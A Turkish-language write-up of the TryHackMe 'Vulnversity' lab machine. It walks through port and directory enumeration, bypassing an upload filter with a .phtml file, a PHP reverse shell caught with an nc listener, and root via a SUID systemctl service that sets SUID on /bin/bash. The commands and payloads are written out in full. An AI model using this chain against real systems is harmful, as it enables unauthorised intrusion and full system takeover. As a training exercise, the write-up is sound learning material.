# Vulnversity — TryHackMe (Kolay, Linux)

> Web → Kısıtsız Dosya Yükleme → Reverse Shell → SUID (`systemctl`) → root

**Zorluk:** Kolay
**İşletim Sistemi:** Linux (Ubuntu)
**Kazanımlar:** port keşfi, dizin brute-force, dosya yükleme filtresi atlatma, reverse shell, SUID yetki yükseltme (GTFOBins)

---

## 1. Keşif (Enumeration)

### Port taraması

Tam port taraması, web servisinin 80'de **olmadığını** gösterdi — "80 kapalı" demek "web yok" demek değil.

| Port | Servis | Sürüm |
|------|--------|-------|
| 21   | FTP    | vsftpd 3.0.5 |
| 22   | SSH    | OpenSSH |
| 139/445 | SMB | Samba 4 |
| 3128 | HTTP proxy | Squid 4.10 |
| 3333 | HTTP   | Apache httpd 2.4.41 |

```bash
nmap -sC -sV -p- $IP
```

SMB'de yalnızca `print$` ve `IPC$` paylaşımları vardı (ikisi de yönetimsel paylaşım — sonundaki `$` gizli/kısıtlı olduklarını belirtir, anonim erişilebilir bir şey yok). Squid ve Apache sürümlerine dayalı exploit avı boşa çıktı — fazla zaman harcadığım bir çıkmaz sokaktı (bkz. Takıldığım Yerler).

### Port 3333'te dizin brute-force

HTTP portu bulununca doğru refleks: sürüm exploit'i aramadan **önce** dizin brute-force.

```bash
gobuster dir -u http://$IP:3333/ -w /usr/share/dirb/wordlists/common.txt
```

Standart asset klasörleri (`css/`, `js/`, `fonts/`, `images/`) arasında bir dizin sırıtıyordu:

```
internal/   (Status: 301)
```

`internal/` tanımı gereği public olmaması gereken bir şey — foothold oradaydı.

---

## 2. Foothold — Kısıtsız Dosya Yükleme

`http://$IP:3333/internal/index.php` bir **Upload** formu sunuyordu. Rastgele dosyalar şu cevabı verdi:

```
Extension not allowed
```

Bu bir CVE **değil**, bir ürün exploit'i de değil — elle yazılmış, **uzantı filtresi** olan bir form. Zafiyet sınıfı *kısıtsız dosya yükleme atlatma*, ve cevap (hangi uzantının geçtiği) araştırmayla değil **denemeyle** bulunur.

### Burp Suite ile filtreyi haritalama

Upload isteğini Burp'le yakalayıp uzantıyı oracıkta değiştirmek denemeyi hızlandırdı. `.php` engellendi; **`.phtml` filtreyi geçti ve sunucu onu PHP olarak çalıştırdı.**

### Reverse shell

Kali'de hazır bir PHP reverse shell geliyor:

```bash
locate php-reverse-shell.php
# /usr/share/webshells/php/php-reverse-shell.php
```

İki değeri saldırgan makineye geri bağlanacak şekilde düzenle:

```php
$ip   = 'TUN0_IP';   // kendi VPN (tun0) adresin
$port = 4444;
```

Dinleyiciyi başlat, dosyayı `.phtml` olarak yükle, sonra **tarayıcıdan çağır** (çalıştırmayı asıl tetikleyen adım):

```bash
nc -lvp 4444
# tarayıcıda aç: http://$IP:3333/internal/uploads/shell.phtml
```

`www-data` olarak shell düştü:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 3. Yetki Yükseltme — SUID `systemctl`

Her Linux makinesinde ilk refleks: SUID binary'leri listele.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Listenin çoğu her Ubuntu'da standarttır (`sudo`, `su`, `passwd`, `mount`, `pkexec`, …). Bir tanesi oraya **ait değil**:

```
/bin/systemctl
```

SUID çalışan bir servis yöneticisi, yükseltme yolunun ta kendisi. [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) tekniği veriyor: SUID `systemctl` herhangi bir servisi root olarak çalıştırır, dolayısıyla `ExecStart`'ı kalıcı root erişimi verecek bir servis tanımlarsın.

En temiz payload: `/bin/bash`'in kendisini SUID yap, sonra `bash -p` ile root shell'e düş.

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /tmp/root.service

systemctl link /tmp/root.service
systemctl enable --now /tmp/root.service

bash -p
id
```

```
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

Root alındı. Flag'ler redakte edildi.

```
/root/root.txt → [REDACTED]
```

---

## Takıldığım Yerler / Dersler

Dürüst notlar — hatalar kazançlardan daha çok şey öğretti.

- **searchsploit çıkmazı.** Squid, Apache, hatta upload formu için ürün CVE'si aradım. Form elle yazılmıştı — hiçbir CVE eşleşemezdi. *Ders: ortada ürün yoksa CVE de yoktur; exploit veritabanlarıyla değil, teknik sınıflarıyla (dosya yükleme atlatma) düşün.*
- **Reverse shell'i tetiklemeyi unuttum.** `.phtml`'i yükleyip dinleyicide bekledim — yüklemek tek başına hiçbir şey yapmaz; dosya ancak tarayıcıdan **çağrıldığında** çalışır.
- **Kendi Kali yollarımı hedefinkiyle karıştırdım.** FTP keşfinde `/home/kali/...` diye kendi makineme referans verdim — hedefe değil.
- **GTFOBins placeholder'ları.** Şablonu birebir kopyalayıp içinde `/path/to/command` dururken çalıştırdım. Onlar doldurulacak boşluk, gerçek yol değil.
- **İç içe tırnaklar servis dosyasını bozdu.** Dumb shell'de dış `'...'` içindeki `'...chmod...'` stringi erken kapatıp dosyayı bozdu. İçeride çift tırnakla çözüldü: `-c "chmod +s /bin/bash"`. *Link'lemeden önce dosyayı her zaman `cat` ile doğrula.*

---

## Saldırı Zinciri Özeti

```
nmap → 3333 Apache → gobuster → /internal/ → upload formu
  → .phtml uzantı filtresini geçer → PHP reverse shell → www-data
  → find SUID → systemctl → GTFOBins servisi → chmod +s /bin/bash → bash -p → root
```
